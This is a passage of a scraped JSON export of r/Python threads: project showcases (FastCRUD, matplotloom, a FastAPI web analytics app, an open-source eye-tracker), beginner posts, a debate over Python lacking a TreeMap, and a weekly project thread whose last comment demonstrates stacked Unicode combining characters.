    "post_content": "Hi, recently I created event generator in Python called Eventum.\nHere is a link to website: https://eventum-generatives.github.io/Website/\nAnd the main repo: https://github.com/Eventum-Generatives/EventumCore\nWhat My Project Does\nIt can be used in task like:\nGeneration of datasets\nSimulation of processes in real time\nFilling different systems with demo data\nTesting on arbitrary data and stress testing\nTarget Audience\nThis generating tool is mostly for developers and people who work with data. It is also very near to ELK stack, OpenSearch and SIEM systems like Splunk. But you can use it as you want :)\nComparison\nThere is a project Eventgen developed by Splunk, but Eventum has next advantages over it:\nMore rich events scheduling\nExtended functionality in event templates\nMore parametrizable configurations\nHas content developing tools (UI for visualization time distributions and rendering templates)",
    "comments": [
        {
            "author": "Obliterative_hippo",
            "score": "3",
            "content": "Very nice documentation! This looks very useful for benchmark and fuzz testing, thanks for sharing!",
            "replies": [
                {
                    "author": "rnv812",
                    "score": "1",
                    "content": "Thanks"
                }
            ]
        },
        {
            "author": "ekbravo",
            "score": "2",
            "content": "Interesting project, saved. Good work!",
            "replies": [
                {
                    "author": "rnv812",
                    "score": "1",
                    "content": "Thx"
                }
            ]
        }
    ]
},
{
    "post_author": "sagunsh",
    "post_id": "1dmiprt",
    "post_score": "11",
    "post_time": "Sunday, June 23, 2024 at 12:52:59 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a simple web analytics app using Fast API",
    "media": [
        "http://ip-api.com/",
        "https://github.com/sagunsh/webanalytics",
        "https://github.com/ua-parser/uap-python"
    ],
    "post_content": "What My Project Does\nIt s a simple web analytics app that tracks visitors in your website. I am using ip-api.com for geolocation and uap-python library for parsing user agent. At the moment, it simply logs these information to a sqlite database.\nTarget Audience\nAnyone who is learning Python and more specifically Fast API and want to try building some projects. The code is available on github so feel free to explore, add features.\nComparision\nHaving used Django and Flask in the past, I made this project as a way to learn and to explore about Fast API. For a more sophisticated/paid alternative, check out Google Analytics, Plausible, etc.\nSource Code\nhttps://github.com/sagunsh/webanalytics",
    "comments": [
        {
            "author": "mcmron",
            "score": "1",
            "content": "This is a cool project. Do you have any plan to extend the support to other free API such as ip2location.io?",
            "replies": [
                {
                    "author": "sagunsh",
                    "score": "1",
                    "content": "ip-api is just for converting ip address to geolocation, you can use any other services if you like. Code is avaliable, feel free to make changes"
                }
            ]
        },
        {
            "author": "cheesefries-_-",
            "score": "1",
            "content": "Thanks for the code!"
        },
        {
            "author": "Entire-Club5012",
            "score": "1",
            "content": "Having used Django and Flask in the past, I made this project as a way to learn and to explore about Fast API. How did you find Fast API in comparison? Would you use it again?",
            "replies": [
                {
                    "author": "sagunsh",
                    "score": "1",
                    "content": "Yes definitely, I will use it. Flask is still my first preference but I will put Fast API over Django."
                }
            ]
        }
    ]
},
{
    "post_author": "Sebaron",
    "post_id": "hpr28u",
    "post_score": "4958",
    "post_time": "Sunday, July 12, 2020 at 11:29:10 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I am a medical student, and I recently programmed an open-source eye-tracker for brain research",
    "media": [
        "https://external-preview.redd.it/jB0UcUyiF4X9nu1Bm88GACzd-zxiwyP_K-Kp-_ttxzo.png?format=pjpg&auto=webp&s=9305630a9d6e9a8d66f20ca19be0d8de87b190e3"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Sebaron",
            "score": "242",
            "content": "To investigate how the brain uses visual information, I developed an open-source eye-tracker that runs well on consumer-grade hardware. I wrote this software in Python and aimed to design it modularly to encourage customisations. Feedback is welcome! Here is the repo: https://github.com/simonarvin/eyeloop This can be used to design closed-loop experiments in which the eyes affect the system, and the system affects the eyes. If interested in the neuro-scientific aspect, here's our preprint: Preprint: https://www.biorxiv.org/content/10.1101/2020.07.03.186387v1 Our lab: http://www.yoneharalab.com",
            "replies": [
                {
                    "author": "Propeus",
                    "score": "191",
                    "content": ""
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "138",
            "content": "",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "82",
                    "content": ""
                }
            ]
        },
        {
            "author": "the_holger",
            "score": "90",
            "content": "Hey! Some things I noticed about your repo: 1.) Your install instructions ask people to clone the whole repo. That's not really necessary, as \"end users\" won't have any use for the whole git history. 2.) The examples (both example and misc folder) that are being downloaded are about 270MB in size, compared to 351kb of actual code that's just wasteful. I'd make that an optional download for people wanting/needing that 3.) I'd add __pycache__ to the gitignore file Cheers! :)"
        }
    ]
},
{
    "post_author": "HotSwap_",
    "post_id": "fjqoxv",
    "post_score": "4249",
    "post_time": "Monday, March 16, 2020 at 10:23:03 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Laid off for 8 weeks. Anyone else starting their python journey?",
    "media": [
        "https://i.redd.it/uqia9wc853n41.jpg",
        "https://preview.redd.it/uqia9wc853n41.jpg?width=640&crop=smart&auto=webp&s=2d4a9e9e7064d8637fd382305081b6b992ce82a7"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "637",
            "content": "I salute you for this excellent choice in spending your time at home.",
            "replies": [
                {
                    "author": "shiningmatcha",
                    "score": "92",
                    "content": "Spent a couple months reading this!"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "154",
                    "content": ""
                },
                {
                    "author": "leone_nero",
                    "score": "95",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "No_Coffee_9879",
    "post_id": "1dlfj8o",
    "post_score": "0",
    "post_time": "Saturday, June 22, 2024 at 12:44:19 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Introducing Lambda Forge: Simplifying AWS Lambda Deployment and Development!",
    "media": [
        "https://docs.lambda-forge.com/",
        "https://github.com/GuiPimenta-Dev/lambda-forge"
    ],
    "post_content": "Hey everyone,\nI just wanted to share a project I've been working on called Lambda Forge. It's a tool designed to simplify the deployment and management of AWS Lambda functions. If you're like me and spend a lot of time working with serverless architecture, you might find it pretty useful.\nWhat My Project Does\nLambda Forge helps you deploy and manage AWS Lambda functions with ease. One of its standout features is the WebSocket connection for hot reloading of local code. It uses MQTT over Websockets to proxy requests to a local server, making development seamless. No more redeploying code just to see if your changes work!\nTarget Audience\nThis project is meant for developers who work with AWS Lambda in both production and development environments. Whether you're a seasoned backend engineer or just getting started with serverless, Lambda Forge can help streamline your workflow.\nComparison\nCompared to other deployment tools, Lambda Forge focuses on enhancing the development experience with hot reloading capabilities. Many existing tools require a full redeployment for changes to take effect, which can be time-consuming. Lambda Forge's WebSocket integration saves time by allowing you to see changes in real-time without redeployment.\nIf you're interested, you can check out the documentation here: Lambda Forge Docs\nAnd if you want to dive into the code or contribute, here's the GitHub repo: Lambda Forge on GitHub\nI’d love to hear your thoughts and feedback.",
    "comments": [
        {
            "author": "fortunatefaileur",
            "score": "3",
            "content": "This is all extremely vague except it seems that you wrote a dev server that proxies http over mqtt over web sockets and hosts a single Python lambda function? Is that good or bad? You have a section called “comparison” that doesn’t mention any other options, so is not really a comparison and is just a lot of adjectives without many nouns. I am pretty sure there’s lots of other ways to run AWS lambda Python functions on my computer? How is this better than those? How is it worse?"
        }
    ]
},
{
    "post_author": "igorbenav",
    "post_id": "1dq7af3",
    "post_score": "66",
    "post_time": "Friday, June 28, 2024 at 4:03:10 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "FastCRUD - powerful CRUD methods and automatic endpoint creation for FastAPI",
    "media": [
        "https://github.com/igorbenav/fastcrud",
        "https://github.com/awtkns/fastapi-crudrouter",
        "https://igorbenav.github.io/fastcrud/"
    ],
    "post_content": "What My Project Does\nFastCRUD is a Python package for FastAPI, offering robust async CRUD operations and flexible endpoint creation utilities, streamlined through advanced features like auto-detected join conditions, dynamic sorting, and offset and cursor pagination.\nWe recently reached 450 Stars on Github and Over 24k Downloads! With more users joining our community, there's a lot of work ahead. Whether you're a fan of Python, FastAPI, or SQLAlchemy, or just interested in contributing to open-source projects, we'd love your help!\nYou can contribute by:\nOpening issues\nFinding and reporting bugs\nTesting new features\nImproving documentation\nFixing bugs\nAdding new features\nCreating tutorials\nTarget Audience\nPeople who currently use or are interested in FastAPI with SQLAlchemy and SQLModel\nComparison\nFor the endpoint part, there's FastAPI CRUD router, but it's unmaintained (does not support Pydantic V2), for the CRUD methods the alternative would be writing from scratch.\nGitHub: https://github.com/igorbenav/fastcrud\nDocs: https://igorbenav.github.io/fastcrud/",
    "comments": [
        {
            "author": "DigThatData",
            "score": "11",
            "content": "it might help if you provided some kind of side-by-side comparison in the docs. I've been thumbing through your docs and it's unclear to me what the advantage of using your package is over implementing the same thing in \"vanilla\" FastAPI. You also discuss autogenerating endpoints, but then don't illustrate what endpoints get created or how to invoke them. Your documentation seems to be thorough in the \"how to incorporate this in your backend\" side of things, but I think it's lacking a bit in the \"why use this\" and \"here's how you use the thing you just made\" departments",
            "replies": [
                {
                    "author": "igorbenav",
                    "score": "4",
                    "content": "That's a good idea. I wrote it with someone who already knows FastAPI in mind, so I kind of took this stuff for granted. Thanks for the feedback!"
                }
            ]
        },
        {
            "author": "riksi",
            "score": "1",
            "content": "Maybe you can collaborate with the flask one and just make a framework agnostic one?",
            "replies": [
                {
                    "author": "igorbenav",
                    "score": "1",
                    "content": "At least for now, I think this other layer of abstraction would hurt more than help users (the code would get a lot more complex, performance would be worse). Maybe in the future"
                }
            ]
        },
        {
            "author": "ryanstephendavis",
            "score": "-10",
            "content": ""
        },
        {
            "author": "ryanstephendavis",
            "score": "-12",
            "content": "",
            "replies": [
                {
                    "author": "YesterdayDreamer",
                    "score": "14",
                    "content": "Forgot to switch to alt accounts?",
                    "replies": [
                        {
                            "author": "fastlikeanascar",
                            "score": "20",
                            "content": "giving this person the benefit of the doubt, but reddit comments weren't loading or working properly around when he made those comments. he probably made the second comment because the first one didnt appear. src: https://www.redditstatus.com/incidents/wdhk0802p7sc",
                            "replies": [
                                {
                                    "author": "ryanstephendavis",
                                    "score": "9",
                                    "content": "Yup! Commence the downvoting into oblivion 🤷‍♂️"
                                },
                                {
                                    "author": "chinawcswing",
                                    "score": "1",
                                    "content": "Ya reddit has problems all the time, double posts are not uncommon at all. This guy was downvoted a cumulative 23 times by now this? wild."
                                }
                            ]
                        },
                        {
                            "author": "SpareIntroduction721",
                            "score": "3",
                            "content": "Lol"
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "abhi_uno",
    "post_id": "1dmfnzv",
    "post_score": "10",
    "post_time": "Sunday, June 23, 2024 at 9:14:34 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "My library VidGear `v0.3.3` - brings libcamera API Support to python.",
    "media": [
        "https://libcamera.org/",
        "https://abhitronix.github.io/vidgear/latest/gears/pigear/overview/",
        "https://picamera.readthedocs.io/en/release-1.13/",
        "https://github.com/abhiTronix/vidgear",
        "https://github.com/raspberrypi/picamera2"
    ],
    "post_content": "Hello Python developers!\nI'm excited to announce the release of VidGear v0.3.3, which brings official support for the libcamera backend in its PiGear API! This update enhances the capabilities of Raspberry Pi Camera Modules and provides limited USB camera support.\nMore about PiGear:\nPiGear is a specialized API optimized for Raspberry Pi 🍇 Boards, offering comprehensive support for camera modules (e.g., OmniVision OV5647 Camera Module, Sony IMX219 Camera Module) and limited compatibility for USB cameras.\nPiGear implements a seamless and robust wrapper around the Picamera2 Python library, simplifying integration with minimal code changes and ensuring a smooth transition for developers already familiar with the Picamera2 API. PiGear leverages the libcamera API under the hood with multi-threading, providing high-performance 🔥, enhanced control, and functionality for Raspberry Pi camera modules.\nPiGear handles common configuration parameters and non-standard settings for various camera types, simplifying the integration process. PiGear currently supports PiCamera2 API parameters such as sensor, controls, transform, and format, with internal type and sanity checks for robust performance.\nWhile primarily focused on Raspberry Pi camera modules, PiGear also provides basic functionality for USB webcams (only with Picamera2 API), along with the ability to accurately differentiate between USB and Raspberry Pi cameras using metadata.\nPiGear seamlessly switches to the legacy picamera library if the Picamera2 library is unavailable, ensuring seamless backward compatibility. PiGear also provides a flexible multi-threaded framework around the complete picamera API, allowing developers to effortlessly exploit a wide range of parameters, such as brightness, saturation, sensor_mode, iso, exposure, and more. Furthermore, PiGear supports the use of multiple camera modules, including those found on Raspberry Pi Compute Module IO boards and USB cameras (only with Picamera2 API).\nWe're eager to see the innovative projects you'll create with PiGear! For more details and to get started, check out our GitHub repository. Happy coding!\nFeel free to ask any questions or share your feedback below. Let's discuss and innovate together! 🚀",
    "comments": []
},
{
    "post_author": "Active-Fuel-49",
    "post_id": "1dkhmpa",
    "post_score": "4",
    "post_time": "Thursday, June 20, 2024 at 8:40:45 PM GMT+3",
    "flair_text": "News",
    "post_title": "Mirascope-Python's Alternative To Langchain\n",
    "media": [
        "https://www.i-programmer.info/news/90-tools/17275-mirascope-pythons-alternative-to-langchain.html"
    ],
    "post_content": "Mirascope is a Python library that lets you access a range of Large Language Models, but in a more straightforward and Pythonic way.\nhttps://www.i-programmer.info/news/90-tools/17275-mirascope-pythons-alternative-to-langchain.html",
    "comments": []
},
{
    "post_author": "MrGrj",
    "post_id": "fr5561",
    "post_score": "4205",
    "post_time": "Sunday, March 29, 2020 at 3:26:47 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "[Beginner’s Guide] How to start programming in Python",
    "media": [
        "https://preview.redd.it/kwubxzttulp41.jpg?width=640&crop=smart&auto=webp&s=a77f68e16a36e50c7e869c8ff4930f88a74e6a38",
        "https://i.redd.it/kwubxzttulp41.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "anecdotal_yokel",
            "score": "510",
            "content": "Mouse coding. Next. Fucking. Level."
        },
        {
            "author": "JapolloXI",
            "score": "76",
            "content": "",
            "replies": [
                {
                    "author": "SoftBlankey",
                    "score": "27",
                    "content": ""
                }
            ]
        },
        {
            "author": "Elvl3",
            "score": "121",
            "content": "Wash your hand when you done"
        }
    ]
},
{
    "post_author": "Chilangosta",
    "post_id": "7jti46",
    "post_score": "4620",
    "post_time": "Thursday, December 14, 2017 at 9:24:25 PM GMT+3",
    "flair_text": "",
    "post_title": "MS is considering official Python integration with Excel, and is asking for input",
    "media": [
        "https://external-preview.redd.it/LejP60PwIDcM7RSYMUVVmsw5WsyIRrd8Hrmu8FrqgG4.jpg?width=640&crop=smart&auto=webp&s=3562aee92a5582437618364488609254b354aa11",
        "https://i.imgur.com/l2f9Zvb.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "1roOt",
            "score": "743",
            "content": "I think it is a really good idea. Who uses VBA anyways? Or better: who likes to use VBA? If i have a specific problem with VBA it is a hell of a mess to find the right resources to fix my problem. With python, I just do a quick search and can find nearly limitless helpful resources. So go python!",
            "replies": [
                {
                    "author": "Chilangosta",
                    "score": "200",
                    "content": ""
                }
            ]
        },
        {
            "author": "Chilangosta",
            "score": "204",
            "content": ""
        },
        {
            "author": "decimated_napkin",
            "score": "413",
            "content": "Adding python support to Excel is like adding a lion to your pack of hunting dogs and then being upset when the lion just goes off and hunts by itself because your dogs are inconsequential to its success.",
            "replies": [
                {
                    "author": "Hotel_Arrakis",
                    "score": "153",
                    "content": "I'm not sure I agree, but an upvote for your simile."
                }
            ]
        }
    ]
},
{
    "post_author": "DeadDolphinResearch",
    "post_id": "1dssy32",
    "post_score": "52",
    "post_time": "Monday, July 1, 2024 at 4:27:00 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "matplotloom: Weave your frames into matplotlib animations, simply and quickly!",
    "media": [
        "https://github.com/jwkvam/celluloid?tab=readme-ov-file#limitations",
        "https://github.com/jwkvam/celluloid",
        "https://github.com/ali-ramadhan/matplotloom",
        "https://github.com/ali-ramadhan/matplotloom/raw/main/examples/sine_wave.gif",
        "https://github.com/t-makaro/animatplot",
        "https://aliramadhan.me/matplotloom/",
        "https://pypi.org/project/matplotloom/"
    ],
    "post_content": "I just wrote up a small package, matplotloom, to simplify and speed up making animations with matplotlib. I've also written some documentation. It's published on PyPI so you can install it with pip, poetry, or conda.\nYou can see some examples on the GitHub README or in the documentation.\nWhat my project does\nTo visualize simulation output for computational fluid dynamics I've had to make long animations with complex figures for a long time. The animations consist of thousands of frames and the figures are too complex for FuncAnimation and ArtistAnimation. I would always end up saving a bunch of still images and use ffmpeg to create animations from them. This package basically automates this process.\nThe main idea behind matplotloom is to describe how to generate each frame of your animation from scratch, instead of generating an animation by modifying one existing plot. This simplifies generating animations. See the example below and how the code inside the for loops is plain and familiar matplotlib. It also ensures that every feature can be animated and that the generation process can be easily parallelized.\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom matplotloom import Loom\n \nwith Loom(\"sine_wave_animation.gif\", fps=30) as loom:\n for phase in np.linspace(0, 2*np.pi, 100):\n  fig, ax = plt.subplots()\n\n  x = np.linspace(0, 2*np.pi, 200)\n  y = np.sin(x + phase)\n  \n  ax.plot(x, y)\n  ax.set_xlim(0, 2*np.pi)\n  \n  loom.save_frame(fig)\nThis produces this gif animation. More examples in the docs.\nTarget Audience\nYou might find matplotloom useful if:\nyou just want to make animations quickly and easily.\nyou need to create complex animations (many subplots, many different plot types) and are encountering the limitations of matplotlib and existing packages.\nyou, like me, find FuncAnimation and ArtistAnimation difficult and limiting to use.\nyou need to create long animations quickly. Think thousands of frames.\nComparison\nI think matplotloom is simpler to user than other methods of making animations with matplotlib, making it easier to start/pick up and iterate on your animations. It works out-of-the-box on anything matplotlib. The simplicity and flexibility comes at the cost of speed, but matplotloom makes it easy to parallelize frame creation so you can create big animations much more quickly.\nSome comparisons:\nmatplotlib itself has two tools for making animations: FuncAnimation and ArtistAnimation. But to use them you have to write your plotting code differently to modify an existing frame. This makes it difficult to go from plotting still figures to making animations. And some features are non-trivial to animate.",
    "comments": [
        {
            "author": "radarsat1",
            "score": "7",
            "content": "",
            "replies": [
                {
                    "author": "DeadDolphinResearch",
                    "score": "2",
                    "content": ""
                }
            ]
        },
        {
            "author": "Helpful_Arachnid8966",
            "score": "4",
            "content": "",
            "replies": [
                {
                    "author": "DeadDolphinResearch",
                    "score": "1",
                    "content": ""
                }
            ]
        },
        {
            "author": "FeLoNy111",
            "score": "2",
            "content": "Wow, definitely gonna use this. Thanks! Well done",
            "replies": [
                {
                    "author": "DeadDolphinResearch",
                    "score": "1",
                    "content": "Awesome! Glad to hear it might be useful to someone! Please feel free to report issues or request features on GitHub if you think of anything!"
                }
            ]
        },
        {
            "author": "denehoffman",
            "score": "2",
            "content": "Wonderful",
            "replies": [
                {
                    "author": "DeadDolphinResearch",
                    "score": "1",
                    "content": "Thank you!"
                }
            ]
        },
        {
            "author": "Monkey_King24",
            "score": "2",
            "content": "CFD ? Fellow Mech and Python enjoyer ?",
            "replies": [
                {
                    "author": "DeadDolphinResearch",
                    "score": "2",
                    "content": "Haha close! I do geophysical fluid dynamics and ocean modeling in Julia, but I do a lot of stuff in Python including lots of plotting!"
                }
            ]
        }
    ]
},
{
    "post_author": "nikostrongioglou",
    "post_id": "1dr6svo",
    "post_score": "0",
    "post_time": "Saturday, June 29, 2024 at 11:44:57 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Lack of TreeMap equivalent in Python",
    "media": [],
    "post_content": "Java - among other languages - has a TreeMap data structure. This map lets us keep the entries sorted based on a given key. I find this scenario very common and I consider Java quite \"considerate\" for providing a data structure like this out-of-the-box.\nOn the other side, Python does not provide such a structure in its main specifications. There are a few semi-solutions out there:\nThere's SortedDict from the sortedcontainers package that we have to install.\nThere's OrderedDict from the main specification that only respects insertion order - like dict() but the user needs to sort entries themselves.\nOne can use a heapq of tuples but this does not maintain uniqueness or provide O(1) access.\nI have read a few discussions out there on the topic but unfortunately, most of them revolve around the notion of not-needing-it. I would argue that when a data structure can model such a common scenario, it's more than worthy of being added to the main specification of a language.\nWhy did then Python decide to exclude such an integral data structure from its main specification?",
    "comments": [
        {
            "author": "fortunatefaileur",
            "score": "93",
            "content": "You’re massively overestimating how much anyone else cares about this niche data structure. In 2024 it’s trivial to install libraries for Python The stdlib isn’t a good place for new data structures",
            "replies": [
                {
                    "author": "nikostrongioglou",
                    "score": "-21",
                    "content": "",
                    "replies": [
                        {
                            "author": "Dull-Researcher",
                            "score": "17",
                            "content": "Standard library is where modules go to die. Does this work for you? https://pypi.org/project/pytreemap/"
                        },
                        {
                            "author": "napolitain_",
                            "score": "0",
                            "content": "You have a point in my opinion, those libraries once accepted as the best solution should be integrated in std"
                        }
                    ]
                }
            ]
        },
        {
            "author": "TheBlackCat13",
            "score": "27",
            "content": "I would argue that when a data structure can model such a common scenario What scenario? You said it is useful because it is useful, but you never explain under what scenario it is useful. Data structures aren't going to go into the standard library unless someone can make the case that it is generally, widely, extremely useful. So if you are going to claim this needs to be in the standard library, the burden is on you to justify that with real-world uses. I have personally never needed this. Others who have commented agree. So it isn't as immediately obvious the usefulness of such a data structure as you seem to think."
        },
        {
            "author": "gerardwx",
            "score": "20",
            "content": "https://grantjenks.com/docs/sortedcontainers/",
            "replies": [
                {
                    "author": "NerdyWeightLifter",
                    "score": "20",
                    "content": "This is the answer. SortedDict provide all of the characteristics you'd expect from a TreeMap. Key/Value lookups O(log N) for insertion and deletion. Ordered keys for iteration No null keys If you work with a decent Python distribution like Anaconda, sortedcontainers is already included. If not, then just \"pip install sortedcontainers\" You also get SortedSet and SortedList with that for a couple of useful variations on the theme."
                }
            ]
        },
        {
            "author": "thegreattriscuit",
            "score": "13",
            "content": "I think this conversation can be simplified. It's not in there because no one has seen the value of including it and prioritized that enough to take the time to submit a PEP. If you feel that strongly, then submit a proposal and be convincing enough that people take your idea seriously."
        },
        {
            "author": "error1954",
            "score": "11",
            "content": "This is not an integral data structure."
        },
        {
            "author": "divad1196",
            "score": "14",
            "content": "I never needed it. Probably, in most scenarios there are other approach. And as mentionned, this has nothing to do in the default libraries, but you can make use of bisect module. Yeah, keeping it sorted on insertion is better, but do you need it? You can just sort the values whenever you need to iterate over them. Leave a comment on that and move forward. Maybe you are lucky and the default sort algorithm are faster on already sorted list. Also, since python 3.6, you don't need ordered dict anymore, you can just use a dict which keeps insertion order (mentionned in the specification). If you don't have time to implement. As mentionned, you can use bisect module to have a list of element sorted and do lookup on it instead of using a dict NOTE: the behaviour is different when re-inserting a key, but there are many solutions depending on your use-case."
        },
        {
            "author": "kenflingnor",
            "score": "10",
            "content": "I’ve never had a use case where this data structure would’ve been helpful. Could you explain why you think it’s so important?"
        },
        {
            "author": "ArabicLawrence",
            "score": "4",
            "content": "Can’t you simply code it yourself? from collections import OrderedDict class TreeMap(OrderedDict): def __init__(self, sort_key, *args, **kwargs): self.sort_key = sort_key super().__init__(*args, **kwargs) self._rebuild() def _rebuild(self): \"\"\"Rebuild the OrderedDict to maintain sorted order.\"\"\" items = sorted(self.items(), key=lambda item: item[1][self.sort_key]) super().__init__(items) def __setitem__(self, key, value): \"\"\"Set an item and maintain sorted order.\"\"\" super().__setitem__(key, value) self._rebuild() def update(self, *args, **kwargs): \"\"\"Update items and maintain sorted order.\"\"\" super().update(*args, **kwargs) self._rebuild() def setdefault(self, key, default=None): \"\"\"Set a default value for a key and maintain sorted order.\"\"\" super().setdefault(key, default) self._rebuild()"
        }
    ]
},
{
    "post_author": "winner_godson",
    "post_id": "7mwgtw",
    "post_score": "4196",
    "post_time": "Friday, December 29, 2017 at 10:34:05 PM GMT+3",
    "flair_text": "",
    "post_title": "Python Cheet Sheet for begineers",
    "media": [
        "https://i.redd.it/4iklecheyw601.jpg",
        "https://preview.redd.it/4iklecheyw601.jpg?auto=webp&s=44cef0e4f93c035164a8431548074f2654bd3cc6"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "rouxgaroux00",
            "score": "169",
            "content": "",
            "replies": [
                {
                    "author": "danelka0",
                    "score": "151",
                    "content": ""
                }
            ]
        },
        {
            "author": "PurpleIcy",
            "score": "415",
            "content": ""
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dm9767",
    "post_score": "22",
    "post_time": "Sunday, June 23, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "shawncaza",
            "score": "9",
            "content": "Web Scraping: I've been working on a project that creates podcast feeds by using scrapy to crawl community radio station websites. openAI Whisper is used to transcribe audio files, identify language, and open source summarization models are used to create episode summaries. Sci-kit learn is used to generate tags for shows based on their descriptions, and perform k-means clustering on show image colours in order to generate the show specific CSS gradients used in the UI. Where a show is identified as having it's own web site, that website is crawled to check if that particular show has an existing podcast feed listed. Apple and Spotify APIs are used to check if shows already have a feed on those services. Would be happy to hear criticism or feedback on the code. Would also welcome contributions. I have some ideas for improvement identified here.",
            "replies": [
                {
                    "author": "nycstartupcto",
                    "score": "2",
                    "content": "Nice!"
                },
                {
                    "author": "Ok-Frosting7364",
                    "score": "2",
                    "content": "This is neat"
                }
            ]
        },
        {
            "author": "TOMOHAWK35",
            "score": "4",
            "content": "Working my way through a pygame and tutorial and simultaneously trying to build my own 2D arpg game. Been a lot of fun so far."
        },
        {
            "author": "DigThatData",
            "score": "4",
            "content": "unicode fucking up my shit rn",
            "replies": [
                {
                    "author": "Cuzeex",
                    "score": "1",
                    "content": "How?",
                    "replies": [
                        {
                            "author": "DigThatData",
                            "score": "1",
                            "content": "Didn't come here looking for assistance, just venting. TLDR: I've been working on modernizing some in-house ML inference code, and the project has been a headache from the starting gun. I've been blocked by some difficult to debug issues that appear to be stemming from an interaction between the client and the server, both of which are doing sort of funny, somewhat independent things wrt handling unicode. The root of the headache is characters that are composed from multiple code points."
                        }
                    ]
                },
                {
                    "author": "Intelligent_Arm_7186",
                    "score": "1",
                    "content": "im a newbie to coding but i ran into a unicode problem and solved it with \"r\"",
                    "replies": [
                        {
                            "author": "DigThatData",
                            "score": "2",
                            "content": "lol thanks, unfortunately this unicode problem is a bit more involved than that. so one of the fun things you can do with unicode is render characters (graphemes) that are composites of multiple codepoints ļ̴̢̛͎̙͉̗̖̣̼͈̻̬͔̗̪̣̬̱̤̻͇̟͉̯̂̔̾͒͂̍̀̒͋̋̿̑̓̌̏͛͆̾̓̓́̿͊͒̑͗͂́̄͒͒̄͌̔̿̍̈́̔́̌̒̐̄̏̈́́̆́̑̋͋̏̉̋̕͘͘͠͠͝͠ī̴̢̡̛̛̛̼͚̫̺͇͍̗͉͎̰̖̩̥̬̻͍̦̟̠̱̦̼̺̲̦͎̫̟̅͛̉̔̃͑̃̓͑̍̊́́͒́͆̌̍̾́̐̎͐̓̽̏̎́̀̆̌̇̈́͒͋̆̓̾́̃̌̑͆̿̈́̌̊̉̾̎͌̓͂̀͗͋͗̈́͑̋͒͑̎͂͊͂̑͂̀̈͊̐̓̊͗͂͌̎̀̇̈́̃͛͆̋̽̉̅̈̇͌͛̑̾̓͒̾͌̋̆̏͒̈́̓͆̾̈̆̈́̿̋̔̈́̏̈́̈́̀̈́̋̇̌̀̽͗̌̌̒̓̕̕͘̚͘̕͜͜͝͝͠͠͠͠͠k̸̨̨̢̨̢̡̢̧̧̢̨̧̢̧͎̠̤̫͔͚̤̱̠͔̪̣͍̪̺̺̬̠̩̘͓̦͔̺̳̗͕̦͔̺͔͓̣̗̝̟̩̼͈͖̝̦̦̞̙̥̙͈̞͉̖͓̣̲͓̝̪̲͍͎̙̜͚̤̱͍̜̪͎̻̻̗̞̺̱̤̺̣̣̪̘̪͖͈͕̠̜̪̺̩̳͓͙͓͍̥͍͚̱̜̼̟͍͉̤̖͓̱͓̺͕͎͔̞̼͓̲̲̙͔̼͙̤̤̮͓̇̾̏̓̎̓̑́̾̓̂͛̎̎̔̾͒͐̽̃̀̑̄̔̈́́̈́͛́̅̓̍̒̄̎̒̑̐̆̽̄̉̇̒̐͋̽͗̀̅̎̊̈́̋̊̉͛͐̓̽́̓̓̄̌͊̈́́͆̀͋͋̓̉͘̚̚̕̚͜͜͜͝͝͝͝͝͝ͅͅͅͅe̷̛̛̖͔͎̱̩̫̗̤̐̈́̍͑̑̓̃̃̾͛͗̒̂̌̋̐̉̄̽̓̇̾̄̎́͌͐͋̊̈́̍́̉̐̐̄̃͗̒̊͐̌͊̒́̈͛̾̋̍̊̊͒̀͐̈́̀̽̆̉̄̒͂́̅͒̉͐̎͋̓̀̅͒́͌̾̈̓͌̾͐̽͗̽̃͐̽̀͂̊̉͋̿̎̀̒́̄͑̍͊͋̀͌̆͋̀͌̀̽͌͐͋͘̚͘̕̕̚͘̕̚͠͝͝͝͝͠͠͠ 